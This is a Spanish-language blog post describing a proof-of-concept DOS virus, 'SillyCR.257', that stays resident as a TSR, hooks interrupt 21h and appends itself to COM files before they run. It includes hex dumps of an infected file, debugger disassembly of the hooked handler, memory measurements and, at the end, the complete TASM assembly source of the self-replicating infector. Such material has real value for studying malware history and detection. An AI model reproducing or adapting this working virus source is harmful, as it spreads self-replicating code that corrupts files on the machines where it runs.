---
categories: [malware, programacion]
layout: post
published: true
tags: [16-bit, ASM-x86, DOS, PoC, TASM, Virus]
title: "Prueba de concepto - Virus: x86/DOS, COM, Postpending, Residente TSR"
toc: true
---

Prueba de concepto de virus en la plataforma x86/DOS con estrategia de infección por 
postpending (adición posterior) en archivos COM. El virus permanece residente en 
memoria convencional como un programa TSR normal. Intercepta los servicios I/O de 
DOS para infectar archivos antes de ser ejecutados.

## Método de infección
Durante la infección, el virus reemplaza los primeros bytes del archivo huésped
(cabezal original) con una instrucción `JMP` (cabezal viral) que dirige el flujo
de ejecución hacia el final del archivo donde se añade el cuerpo viral. El cabezal
original reemplazado es guardado en el cuerpo viral.

{% img infection.png | {"width":"450"} %}

Cuando un archivo infectado es ejecutado, el virus se carga en memoria junto con este y 
se ejecuta primero realizando sus propias acciones, al terminar restaura el cabezal original
 en el offset `CS:0100` (dirección de memoria donde se cargan los archivos COM en DOS) y 
salta hacia dicho offset para permitirle al huésped su ejecución normal. Esto último 
dificulta la detección por parte del usuario.

El cabezal viral contiene además una firma, el byte `'V'`, utilizada para reconocimiento
de archivos ya infectados.

La primer generación del virus es diferente a las siguientes. La primera no tiene cabezal viral, 
ya que no está adherida a un huésped. Las siguientes generaciones al estar adheridas a un 
huésped se diferencian por tener cabezal y cuerpo viral.

Como resultado de la infección:
* Los archivos infectados ocuparán más espacio al contener el código viral. Con técnicas 
  de _stealth_ esta información se puede ocultar del usuario para dificultar su detección.
* Los archivos infectados tendrán un tiempo de ejecución mayor al incluir la pre ejecución
  del virus.

## Residencia en memoria
El virus permanece residente en el rango de memoria convencional (por debajo de 640KB - segmento A000)
como un programa TSR (Terminate and Stay Resident) normal mediante el servicio 27h provisto por
DOS. Durante la infección, el virus reconoce si ya se encuentra residente mediante un 
servicio propio en la interrupción 21h.

{% img memory.png | {"width":"450"} %}

## Método de propagación
El virus modifica el handler original de la interrupción 21h cambiando el vector del handler en
la IVT (Interrupt Vector Table) para interceptar las llamadas a los servicios I/O de DOS. 
Esto tiene dos objetivos:
* Proveer un servicio de reconocimiento propio para saber si ya se encuentra residente en memoria.
* Detectar las ejecuciones de archivos en el sistema para infectarlos antes de que estos se ejecuten.

## Otros detalles
* Se utiliza una técnica básica para calcular el $\Delta$ offset, este es el posicionamiento
  relativo del virus en el archivo infectado. Esta técnica es detectada por cualquier 
  anti-virus decente.
* El virus no verifica que el tamaño del archivo COM sea adecuado para la infección. Si 
  luego de la infección el tamaño total supera los 64KB, ya no es un archivo COM válido.

## Flujo de ejecución
Al ejecutarse un archivo infectado, el virus se hace residente en memoria y modifica la IVT:

{% img flow1.png | {"width":"480"} %}

Cuando el virus ya es residente en memoria, intercepta todas las llamadas a la interrupción 21h:

{% img flow2.png | {"width":"400"} %}

## Análisis estático
Hex dump de un archivo sano de tamaño 80 bytes:

<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span>B4 09 BA 39 01 CD 21 90</span>  <span>´.º9.Í!.</span>
<span>0x0008</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0010</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0018</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0020</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0028</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0030</span>  <span>90 90 90 90 90 B4 00 CD</span>  <span>.....´.Í</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
</pre>

Hex dump del archivo infectado:

<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span class="vs">E9 4D 00 56</span> <span>01 CD 21 90</span>  <span class="vs">éM.V</span><span>.Í!.</span>  Cabezal viral
<span>0x0008</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0010</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0018</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0020</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0028</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0030</span>  <span>90 90 90 90 90 B4 00 CD</span>  <span>.....´.Í</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
<span>0x0050</span>  <span class="vs">E8 00 00 5D 81 ED 0B 01</span>  <span class="vs">è..].í..</span>  Cuerpo viral
<span>0x0058</span>  <span class="vs">B8 CD AB CD 21 3D 9A 02</span>  <span class="vs">¸Í«Í!=š.</span>
<span>0x0060</span>  <span class="vs">75 11 B9 04 00 8D B6 05</span>  <span class="vs">u.¹...¶.</span>
<span>0x0068</span>  <span class="vs">02 BF 00 01 F3 A4 B8 00</span>  <span class="vs">.¿..ó¤¸.</span>
<span>0x0070</span>  <span class="vs">01 FF E0 B4 35 B0 21 CD</span>  <span class="vs">.ÿà´5°!Í</span>
<span>0x0078</span>  <span class="vs">21 3E 89 9E 01 02 3E 8C</span>  <span class="vs">!&gt;‰ž..&gt;Œ</span>
<span>0x0080</span>  <span class="vs">86 03 02 B4 25 B0 21 8D</span>  <span class="vs">†..´%°!.</span>
<span>0x0088</span>  <span class="vs">96 4B 01 CD 21 8D 96 0F</span>  <span class="vs">–K.Í!.–.</span>
<span>0x0090</span>  <span class="vs">02 CD 27 3D CD AB 74 08</span>  <span class="vs">.Í'=Í«t.</span>
<span>0x0098</span>  <span class="vs">3D 00 4B 74 07 E9 A8 00</span>  <span class="vs">=.Kt.é¨.</span>
<span>0x00A0</span>  <span class="vs">B8 9A 02 CF E8 00 00 5D</span>  <span class="vs">¸š.Ïè..]</span>
<span>0x00A8</span>  <span class="vs">81 ED 5F 01 9C 50 53 51</span>  <span class="vs">.í_.œPSQ</span>
<span>0x00B0</span>  <span class="vs">52 56 1E 8B F2 AC 0A C0</span>  <span class="vs">RV.‹ò¬.À</span>
<span>0x00B8</span>  <span class="vs">74 13 3C 2E 75 F7 AC 3C</span>  <span class="vs">t.&lt;.u÷¬&lt;</span>
<span>0x00C0</span>  <span class="vs">43 75 0A AC 3C 4F 75 05</span>  <span class="vs">Cu.¬&lt;Ou.</span>
<span>0x00C8</span>  <span class="vs">AC 3C 4D 74 02 EB 6E B4</span>  <span class="vs">¬&lt;Mt.ën´</span>
<span>0x00D0</span>  <span class="vs">3D B0 02 CD 21 72 6A 93</span>  <span class="vs">=°.Í!rj“</span>
<span>0x00D8</span>  <span class="vs">0E 1F B4 3F B9 04 00 8D</span>  <span class="vs">..´?¹...</span>
<span>0x00E0</span>  <span class="vs">96 05 02 CD 21 72 56 3E</span>  <span class="vs">–..Í!rV&gt;</span>
<span>0x00E8</span>  <span class="vs">80 BE 08 02 56 74 4E B4</span>  <span class="vs">€¾..VtN´</span>
<span>0x00F0</span>  <span class="vs">42 B0 02 33 C9 33 D2 CD</span>  <span class="vs">B°.3É3ÒÍ</span>
<span>0x00F8</span>  <span class="vs">21 72 42 3E 89 86 09 02</span>  <span class="vs">!rB&gt;‰†..</span>
<span>0x0100</span>  <span class="vs">B4 40 B9 09 01 8D 96 08</span>  <span class="vs">´@¹...–.</span>
<span>0x0108</span>  <span class="vs">01 CD 21 72 30 3E 8B 86</span>  <span class="vs">.Í!r0&gt;‹†</span>
<span>0x0110</span>  <span class="vs">09 02 2D 03 00 3E C6 86</span>  <span class="vs">..-..&gt;Æ†</span>
<span>0x0118</span>  <span class="vs">0B 02 E9 3E 89 86 0C 02</span>  <span class="vs">..é&gt;‰†..</span>
<span>0x0120</span>  <span class="vs">3E C6 86 0E 02 56 B4 42</span>  <span class="vs">&gt;Æ†..V´B</span>
<span>0x0128</span>  <span class="vs">B0 00 33 C9 33 D2 CD 21</span>  <span class="vs">°.3É3ÒÍ!</span>
<span>0x0130</span>  <span class="vs">72 0B B4 40 B9 04 00 8D</span>  <span class="vs">r.´@¹...</span>
<span>0x0138</span>  <span class="vs">96 0B 02 CD 21 B4 3E CD</span>  <span class="vs">–..Í!´&gt;Í</span>
<span>0x0140</span>  <span class="vs">21 1F 5E 5A 59 5B 58 9D</span>  <span class="vs">!.^ZY[X.</span>
<span>0x0148</span>  <span class="vs">EA A0 14 00 F0</span> <span>B4 09 BA</span>  <span class="vs">ê ..ð</span><span>´.º</span>  Cabezal original
<span>0x0150</span>  <span>39                     </span>  <span>9       </span>
</pre>
<style>
  pre.ovf span { color: #000; }
  pre.ovf span:first-of-type { line-height:200% }
  pre.ovf span.vs { color: #ff0000 }
</style>

## Análisis dinámico
Se considera un archivo infectado VTEST.COM en un ambiente MS-DOS 6.22, 
Microsoft Virtual PC 6.0 con VM Additions.

### Uso de memoria

**Antes de la infección**  
Resultado de `MEM /C`:

<pre>Name           Total       =   Conventional   +   Upper Memory
  --------  ----------------   ----------------   ----------------
  MSDOS       16,157   (16K)     16,157   (16K)          0    (0K)
  SETVER         480    (0K)        480    (0K)          0    (0K)
  HIMEM        1,120    (1K)      1,120    (1K)          0    (0K)
  DISPLAY      8,304    (8K)      8,304    (8K)          0    (0K)
  CDROM        4,224    (4K)      4,224    (4K)          0    (0K)
  COMMAND      2,928    (3K)      2,928    (3K)          0    (0K)
  SMARTDRV    29,024   (28K)     29,024   (28K)          0    (0K)
  KEYB         6,944    (7K)      6,944    (7K)          0    (0K)
  FSHARE      26,576   (26K)     26,576   (26K)          0    (0K)
  IDLE           528    (1K)        528    (1K)          0    (0K)
  MSCDEX      32,096   (31K)     32,096   (31K)          0    (0K)
  MOUSE        8,880    (9K)      8,880    (9K)          0    (0K)
  Free       516,976  (505K)    516,976  (505K)          0    (0K)

Memory Summary:
  Type of Memory       Total   =    Used    +    Free
  ----------------  ----------   ----------   ----------
  Conventional         654,336      137,360      516,976
  Upper                      0            0            0
  Reserved                   0            0            0
  Extended (XMS)    15,663,104    2,162,688   13,500,416
  ----------------  ----------   ----------   ----------
  Total memory      16,317,440    2,300,048   14,017,392
  Total under 1 MB     654,336      137,360      516,976
</pre>

**Después de la infección**  
Resultado de `MEM /C`:

<pre class="ovf">Name           Total       =   Conventional   +   Upper Memory
  --------  ----------------   ----------------   ----------------
  MSDOS       16,157   (16K)     16,157   (16K)          0    (0K)
  SETVER         480    (0K)        480    (0K)          0    (0K)
  HIMEM        1,120    (1K)      1,120    (1K)          0    (0K)
  DISPLAY      8,304    (8K)      8,304    (8K)          0    (0K)
  CDROM        4,224    (4K)      4,224    (4K)          0    (0K)
  COMMAND      2,928    (3K)      2,928    (3K)          0    (0K)
  SMARTDRV    29,024   (28K)     29,024   (28K)          0    (0K)
  KEYB         6,944    (7K)      6,944    (7K)          0    (0K)
  FSHARE      26,576   (26K)     26,576   (26K)          0    (0K)
  IDLE           528    (1K)        528    (1K)          0    (0K)
  MSCDEX      32,096   (31K)     32,096   (31K)          0    (0K)
  MOUSE        8,880    (9K)      8,880    (9K)          0    (0K)
<span class="vs">  VTEST          784    (1K)        784    (1K)          0    (0K)</span>
  Free       516,192  (504K)    516,192  (504K)          0    (0K)

Memory Summary:
  Type of Memory       Total   =    Used    +    Free
  ----------------  ----------   ----------   ----------
  Conventional         654,336      138,144      516,192
  Upper                      0            0            0
  Reserved                   0            0            0
  Extended (XMS)    15,663,104    2,162,688   13,500,416
  ----------------  ----------   ----------   ----------
  Total memory      16,317,440    <span class="vs">2,300,832   14,016,608</span>
  Total under 1 MB     654,336      <span class="vs">138,144      516,192</span>
</pre>

La presencia del virus es evidente como la de cualquier programa TSR, por lo cual es 
fácil de detectar. En este caso ocupa 784 bytes de espacio en memoria convencional, pero 
este espacio incluye el código del huésped y por lo tanto depende del mismo.

Resultado de `MEM /M VTEST`:

<pre>Segment  Region       Total        Type
  -------  ------  ----------------  --------
   0218A                160    (0K)  Environment
   02194                624    (1K)  Program
                   ----------------
  Total Size:           784    (1K)
</pre>

Como es típico, un programa en memoria ocupa al menos dos bloques contiguos, el primero (218A) 
tiene una copia de los datos de entorno, y el segundo (2194) tiene el PSP, código y datos del 
programa. Una posible mejora del virus es liberar el bloque de datos de entorno ya que no 
son utilizados y así ocupar menos espacio.

El código viral tiene en memoria un tamaño de 263 B (257 B de código + 6 B reservados para datos), 
a esto se le suma el PSP con 256 B y el tamaño del archivo huésped que en este caso son 80 B, 
por esto el segundo bloque requiere en total 599 B, pero por el alineamiento en párrafos (16 B) 
el próximo múltiplo de 16 es $\lceil\frac{599}{16}\rceil \times 16 = 608 B$. Además, cada bloque 
tiene un MCB correspondiente de 16 B, por lo tanto el bloque 2194 tiene un tamaño total de 624 B.

### Handler de 21h
La IVT ocupa los primeros 1024 bytes de memoria RAM, segmento 0000.  
El vector de la interrupción 21h es la dirección de memoria del handler en forma 
de 4 bytes `segmento:offset`, este se encuentra en el offset 84h de la IVT.

**Antes de la infección**  
Hex dump de los 4 bytes del vector 21h:

<pre class="ovf">-D 0000:0084 L4                                  
0000:0080              E1 20 04 11
</pre>

El handler original de 21h se encuentra en 1104:20E1.

**Después de la infección**  
Hex dump de los 4 bytes del vector 21h:

<pre class="overf">-D 0000:0084 L4
0000:0080              93 01 95 21
</pre>

El vector ya no es el mismo. 

Desensamblado del handler referenciado por el nuevo vector:

<pre class="ovf">-U 2195:0193
2195:0193 3DCDAB       CMP    AX,ABCD            ; inicio del handler viral
2195:0196 7408         JZ     01A0                               
2195:0198 3D004B       CMP    AX,4B00                            
2195:019B 7407         JZ     01A4                               
2195:019D E9A800       JMP    0248                               
2195:01A0 B89A02       MOV    AX,029A                            
2195:01A3 CF           IRET                                    
2195:01A4 E80000       CALL   01A7                               
2195:01A7 5D           POP    BP                                 
2195:01A8 81ED5F01     SUB    BP,015F                            
2195:01AC 9C           PUSHF                                     
2195:01AD 50           PUSH   AX                                 
2195:01AE 53           PUSH   BX                                 
2195:01AF 51           PUSH   CX                                 
2195:01B0 52           PUSH   DX                                 
2195:01B1 56           PUSH   SI                                 
2195:01B2 1E           PUSH   DS  
</pre>

Desensamblado del comienzo:

<pre class="ovf">-U 2195:0100
2195:0100 E94D00       JMP   0150               ; cabezal viral
2195:0103 56           PUSH  SI                 ; marca del virus: 'V'
2195:0104 01CD         ADD   BP,CX
2195:0106 21909090     AND   [BX+SI+9090],DX
2195:010A 90           NOP
2195:010B 90           NOP
2195:010C 90           NOP
2195:010D 90           NOP
2195:010E 90           NOP                            
</pre>

## API utilizada
Se utilizan 8 servicios de la DOS API mediante la interrupción de software 21h.

<div class="table-responsive">
<table class="table" >
   <thead class="thead-light">
    <tr>
      <th>Servicio</th>
      <th>AH</th>
      <th>Parámetros</th>
      <th>Retorno</th>
      <th>Versión DOS</th>
    </tr>
  </thead> 
  <tr>
    <td>Terminar programa</td>
    <td>00h</td>
    <td class="center">-</td>   
    <td class="center">-</td>
    <td>1+</td>
  </tr>
  <tr>
    <td>Establecer vector en IVT</td>  
    <td>25h</td>
    <td>AL = número de interrupción</td>
    <td>DS:DX = puntero al nuevo handler de la interrupción</td> 
    <td>2+</td>
  </tr>
  <tr>
    <td>Obtener vector de IVT</td>
    <td>35h</td> 
    <td>AL = número de interrupción</td>
    <td>ES:BX = puntero al handler de la interrupción</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Abrir archivo existente</td>
    <td>3Dh</td> 
    <td>AL = modos de acceso e intercambio<br />DS:DX -> nombre del archivo (ASCIZ)</td>  
    <td>Éxito: CF = 0, AX = handle del archivo <br />Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Cerrar archivo</td>
    <td>3Eh</td>
    <td>BX = handle del archivo</td>
    <td>Éxito: CF = 0, AX destruido <br />Error: CF = 1, AX = código de error</td>  
    <td>2+</td>
  </tr>
  <tr>
    <td>Lectura de archivo<br/> o dispositivo</td> 
    <td>3Fh</td>  
    <td>BX = handle del archivo <br/>CX = nro. de bytes <br/>DS:DX -> offset donde guardar datos</td>  
    <td>Éxito: CF = 0, AX = nro. de bytes transferidos <br />Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Escribir en archivo <br />o dispositivo</td> 
    <td>40h</td>
    <td>BX = handle del archivo <br />CX = nro. de bytes <br />DS:DX -> datos a escribir</td> 
    <td>Éxito: CF = 0, AX = nro. de bytes escritos <br />Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Establecer puntero de archivo</td> 
    <td>42h</td> 
    <td>AL = código de desplazamiento <br/> BX = handle del archivo <br/> CX = mitad mayor de desplazamiento<br/> DX = mitad menor de desplazamiento</td>   
    <td>Éxito: CF = 0, CX = mitad mayor, DX = mitad menor <br/>Error: CF = 1, AX = código de error</td> 
    <td>2+</td>
  </tr>
</table>
</div>

Se utiliza la interrupción 27h (DOS 1.x) para crear programas TSR.

<div class="table-responsive">
<table class="table" >
   <thead class="thead-light">
    <tr>
      <th>Interrupción 27h</th>
      <th>Parámetros</th>
      <th>Retorno</th>
      <th>Versión DOS</th>
    </tr>
  </thead>  
  <tr>
    <td>Terminar programa y dejar porción residente en memoria</td> 
    <td>CS = segmento de PSP <br/> DX = dirección más alta a ocupar en memoria</td> 
    <td>-</td>
    <td>1+</td>
  </tr>
</table>
</div>

## Código fuente
{% highlight nasm linenos %}
;##############################################################################  
;# Nombre:        virus://DOS/SillyCR.257  
;# Plataforma:    Intel x86  
;# SO:            DOS v2.0+  
;# Lenguaje:      ASM x86-16 (sintaxis Intel)  
;# Herramientas:  TASM v4.1, TLINK v7.1.30  
;# Tipo:          Postpending, Resident, COM infector  
;# Tamaño:        257 bytes  
;# Propagación:   En archivos COM antes de ser ejecutados (INT 21h - AH=4B).  
;# Infección:     Postpending en archivos COM (no READ-ONLY).
;# Residente:     Si. Dentro de la memoria convencional (0-640KB), en la  
;#                zona baja del sistema.  
;# Stealth:       No  
;# Payload:       No  
;##############################################################################

.8086  
.model tiny

assume cs:virus, ds:virus

virus segment byte public 'CODE'

    org 100h

start:     
    jmp short body                          ; cabezal, en las siguientes generaciones aquí  
    nop                                     ; habrá un near JMP de 3 bytes  
    db 'V'                                  ; firma viral

    mov ah, 00h                             ; / huésped dummy, solo retorna a DOS  
    int 21h                                 ; \

body:     
    call d_offset                           ; calcular delta offset  

d_offset:     
    pop bp  
    sub bp, offset d_offset 

    mov ax, 0ABCDh                          ; | AX = 0ABCDh  
    int 21h                                 ; |_DOS API - Llamar servicio de reconocimiento del virus

    cmp ax, 029Ah                           ; verificar código de respuesta  
    jne infect_int21h                       ; si no es 666 (29Ah), infectar INT 21h

    mov cx, 4                               ; restaurar cabezal original  
    lea si, [bp + host_head]  
    mov di, 100h  
    rep movsb 

    mov ax, 100h  
    jmp ax                                  ; saltar a CS:0100 y ejecutar huésped 

infect_int21h:    
    mov ah, 35h                             ; | AH = 35h  
    mov al, 21h                             ; | AL = número de interrupción, 21h  
    int 21h                                 ; |_DOS API - Obtener vector en ES:BX

    mov [bp + vector_int21], bx             ; guardar vector original de INT 21h  
    mov [bp + vector_int21 + 2], es

    mov ah, 25h                             ; | AH = 25h  
    mov al, 21h                             ; | AL = número de interrupción, 21h  
    lea dx, [bp + handler_int21h]           ; | DS:DX -> dirección del nuevo handler: handler_int21h  
    int 21h                                 ; |_DOS API - Cambiar vector

                                            ; | CS = segmento de PSP  
    lea dx, [bp + eof]                      ; | DX = Tamaño de porción residente (bytes)  
    int 27h                                 ; |_DOS API - Termina el programa y lo deja en memoria 

handler_int21h:    
    cmp ax, 0ABCDh                          ; llamada de reconocimiento del virus:  
    je service_ABCD                         ; responder y retornar  
    cmp ax, 4B00h                           ; llamada para ejecutar archivo:  
    je infect_file                          ; infectar y delegar  
    jmp handler_old                         ; en otro caso, delegar al handler original de INT 21h 

service_ABCD:    
    mov ax, 029Ah                           ; código de respuesta: 666 (29Ah)  
    iret                                    ; retornar de la interrupción

infect_file:     
    call d_offset2                          ; calcular delta offset  
    
d_offset2:    
    pop bp  
    sub bp, offset d_offset2

    pushf                                   ; guardar estado CPU  
    push ax                                 ; guardar registros que serán utilizados  
    push bx  
    push cx  
    push dx  
    push si  
    push ds  
                                            ; por la llamada AX=4B00h, DS:DX apunta al nombre del archivo  
    mov si, dx                              ; verificar que sea extensión ".COM"  
    
loop_str:    
    lodsb  
    or al, al  
    jz check_fail  
    cmp al, '.';  
    jne loop_str  
    lodsb  
    cmp al, 'C'  
    jne check_fail  
    lodsb  
    cmp al, 'O' 
    jne check_fail  
    lodsb  
    cmp al, 'M'
    je check_ok

check_fail:      
    jmp close_file

check_ok:      
    mov ah, 3Dh                             ; | AH = 3Dh  
    mov al, 2                               ; | AL = 2, lectura y escritura  
    int 21h                                 ; |_DOS API - Abrir archivo existente 

    jc exit                                 ; si no se puede abrir archivo, restaurar y delegar  
    xchg ax, bx                             ; handle de archivo en BX

    push cs  
    pop ds                                  ; MOV DS, CS

    mov ah, 3Fh                             ; | AH = 3Fh  
    mov cx, 4                               ; | CX = tamaño del cabezal, 4 bytes  
    lea dx, [bp + host_head]                ; | DS:DX -> destino: buffer para cabezal original  
    int 21h                                 ; |_DOS API - Leer de archivo/dispositivo

    jc close_file                           ; no se puede leer el archivo, cerrarlo

    cmp byte ptr [bp + host_head + 3], 'V'  ; comparar 4to byte con la firma viral 'V' 
    je close_file                           ; si el archivo ya esta marcado, cerrarlo

    mov ah, 42h                             ;| AH = 42h  
    mov al, 2                               ;| AL = 2, fin del archivo  
    xor cx, cx                              ;| CX = 0  
    xor dx, dx                              ;| DX = 0  
    int 21h                                 ;|_DOS API - Establecer puntero en archivo 

    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo  
    mov [bp + file_size], ax

    mov ah, 40h                             ; | AH = 40h  
    mov cx, VIRUS_SIZE                      ; | CX = tamaño del virus  
    lea dx, [bp + body]                     ; | DS:DX -> origen: inicio del código viral  
    int 21h                                 ; |_DOS API - Escribir en archivo/dispositivo 

    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo

    mov ax, [bp + file_size]                ; calcular el largo del JMP para el cabezal viral  
    sub ax, 3                               ; restarle 3 bytes del near JMP  
    mov byte ptr [bp + tmp_head], 0E9h      ; construir cabezal viral en buffer temporal (E9h = near JMP)  
    mov word ptr [bp + tmp_head + 1], ax  
    mov byte ptr [bp + tmp_head + 3], 'V' 

    mov ah, 42h                             ; | AH = 42h  
    mov al, 0                               ; | AL = 0, principio del archivo  
    xor cx, cx                              ; | CX = 0  
    xor dx, dx                              ; | DX = 0  
    int 21h                                 ; |_DOS API - Establecer puntero en archivo 

    jc close_file                           ; no se puede trabajar con el archivo, cerrarlo

    mov ah, 40h                             ; | AH = 40h  
    mov cx, 4                               ; | CX = tamaño del cabezal, 4 bytes  
    lea dx, [bp + tmp_head]                 ; | DS:DX -> origen: buffer temporal para cabezal viral  
    int 21h                                 ; |_DOS API - Escribir en archivo/dispositivo 

close_file:     
    mov ah, 3Eh                             ; | AH = 3Eh  
    int 21h                                 ; |_DOS API - Cerrar archivo 

exit:     
    pop ds                                  ; restaurar registros y estado CPU  
    pop si  
    pop dx  
    pop cx  
    pop bx  
    pop ax  
    popf

handler_old:     
    db 0EAh                                 ; JMP FAR  
   
vector_int21    dw   ?, ?                   ; vector original de INT 21h (4 bytes)
host_head       db   90h, 90h, 90h, 90h     ; buffer para cabezal original  
VIRUS_SIZE      equ  ($ - body)             ; tamaño del virus  
file_size       dw   ?                      ; buffer temporal para tamaño del huésped  
tmp_head        db   4 dup (?)              ; buffer temporal para cabezal viral

eof:                                        ; fin de porción residente para TSR 

virus ends  
end start  
{% endhighlight %}

## Bibliografía
{% bibliography -q
   @*[key=Szor2005
   || key=Phalcon-Skism,
   || key=Williams1992] 
%} 